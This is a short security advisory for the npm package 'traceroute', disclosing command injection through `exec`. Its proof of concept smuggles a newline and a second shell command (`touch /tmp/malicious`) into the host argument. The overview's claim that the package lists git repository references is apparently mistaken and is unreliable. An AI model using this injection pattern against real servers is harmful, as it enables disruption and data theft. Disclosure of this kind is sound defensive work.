## Overview
[`traceroute`](https://www.npmjs.com/package/traceroute) is an npm package used for listing references in a remote git repository.

Affected versions of this package are vulnerable to Arbitrary Command Injection due to the insecure use of `exec`. An attacker can add a newline `%0a` after the host addr, and inject malicious shell commands to disrupt server operation or obtain sensitive information.

### PoC by Dor Dali
```js
traceroute = require('traceroute');

host = '127.0.0.1\ntouch /tmp/malicious';

traceroute.trace(host, function (err,hops) {
    // the file /tmp/malicious was created
    console.log(hops);
});
```

## Remediation
There currently is no fixed version for `traceroute`.
A fix is on the master branch but was not published to npm.

## References
- [GitHub Commit](https://github.com/jaw187/node-traceroute/commit/b99ee024a01a40d3d20a92ad3769cc78a3f6386f)
- [GitHub Issue](https://github.com/jaw187/node-traceroute/issues/13)
